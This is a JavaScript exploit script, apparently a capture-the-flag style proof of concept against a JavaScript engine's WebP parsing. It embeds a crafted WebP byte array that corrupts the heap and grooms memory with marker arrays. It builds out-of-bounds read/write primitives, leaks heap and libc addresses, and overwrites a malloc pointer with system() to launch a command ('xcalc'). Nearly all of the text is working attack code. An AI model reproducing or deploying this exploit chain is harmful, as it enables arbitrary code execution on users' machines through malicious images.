// utility
var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);
function d2u(v) {
    f64[0] = v;
    return u32[1]*0x100000000+u32[0];
}
function u2d(val) {
    u32[0] = val&0xffffffff;
    u32[1] = val/0x100000000;
    return f64[0];
}

function hex(val){
    return "0x" + val.toString(16);
}

function hex_u(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "00000000");
    }
    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }
    return ("0x" + ('00000000'+hi.toString(16)).substr(8) +('00000000'+lo.toString(16)).substr(8));
}


// ----------------------------------------------------- exploitation -----------------------------------------------------
const webp = new Uint8Array([82, 73, 70, 70, 136, 2, 0, 0, 87, 69, 66, 80, 86, 80, 56, 76, 123, 2, 0, 0, 47, 0, 0, 0, 16, 26, 15, 130, 36, 9, 146, 36, 73, 18, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 68, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 86, 207, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 238, 221, 157, 7, 65, 146, 4, 73, 146, 36, 9, 48, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 50, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 179, 122, 118, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 119, 247, 206, 131, 32, 73, 130, 36, 73, 146, 4, 24, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 17, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 153, 89, 61, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 187, 123, 231, 65, 144, 36, 65, 146, 36, 73, 2, 140, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 136, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 172, 158, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 221, 189, 243, 32, 72, 146, 32, 73, 146, 36, 221, 221, 185, 187, 187, 187, 187, 187, 187, 71, 68, 68, 68, 68, 68, 68, 68, 68, 86, 207, 2, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]);

let x = [];
let y = [];
let v = [];

// Create a bunch of heap chunks to make the the heap linear I guess, more reliability.
for(let i=0;i<500;i++){
    x.push(new ArrayBuffer(0x2fb0));
    y.push(new Array(1.1, 2.2));
    v.push(new Float64Array(2));
    v[i][0] = 2261634.5098039214; // marker - 0x41414141
    v[i][1] = 2261634.5098039214; // marker - 0x41414141
}

// Last 10 ArrayBuffer's are freed hoping webp huffman table is loaded here.
for(let i=490;i<500;i++){
    x[i] = undefined;
}

for(let i=0;i<5;i++){
    isWebP(webp);
}

// create a bunch of float array with custom marker to identify in memory,

// Function to get the array that has a corrupted size field.
let all_oob = [];
function get_oob_array(){
    for(let i=499;i>490;i--){
        if(y[i][7] != undefined){
            all_oob.push(i);
        }
    }
}

// Function to create a float64array with a corrupted size field. 
function create_oob_array(arr_ind){
    y[arr_ind][21] = 0x5000;
    return v[arr_ind]; 
}

get_oob_array(); // generate the oob arrays.

let oob_ar_ind = all_oob[0];
let oob_arr = create_oob_array(oob_ar_ind);

// Just a normal arb write.
function arb_write(addr, val){
    oob_arr[11] = u2d(addr);
    oob_arr[0] = u2d(val);
}

function arb_read(addr){
    oob_arr[11] = u2d(addr);
    return d2u(oob_arr[0]);
}

heap = d2u(oob_arr[7]) - 0xf30;
console.log("[+] Heap Leak: " + hex(heap));

libc = arb_read(heap+0x2b8) - 0xa6b10;
console.log("[+] Libc Leak: " + hex(libc));

oob_ar_ind = all_oob[1];
oob_arr = create_oob_array(oob_ar_ind);

arb_write(heap+0x2c0, 0x636c616378);

oob_ar_ind = all_oob[2];
oob_arr = create_oob_array(oob_ar_ind);
arb_write(heap+0x2a0, libc+0x50d70) // Over write the malloc call to system in the structure in heap

Math.min(oob_arr);
